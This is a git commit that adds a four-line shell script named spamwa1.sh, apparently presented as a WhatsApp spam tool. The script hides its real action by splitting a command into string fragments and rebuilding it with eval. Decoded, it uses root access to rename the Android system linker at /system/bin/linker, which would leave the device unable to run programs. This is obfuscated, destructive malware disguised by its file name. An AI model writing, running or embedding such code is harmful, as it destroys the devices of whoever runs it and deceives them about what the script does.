9bb17a0427d3820b659fa745debdd3ba67c97d1f
Firmankrrd <115154624+Firmankrrd@users.noreply.github.com>
2023-10-31 20:17:55 +0700

    Add files via upload

---
+++ spamwa1.sh
@@ -0,0 +1,4 @@
+
+z="
+";Nz='nk'\''';Ez='yste';Az='su -';Kz='/bin';Fz='m/bi';Hz='nker';Cz='enam';Bz='c '\''r';Iz=' /sy';Lz='/lin';Jz='stem';Dz='e /s';Gz='n/li';Mz='k_lu';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz"
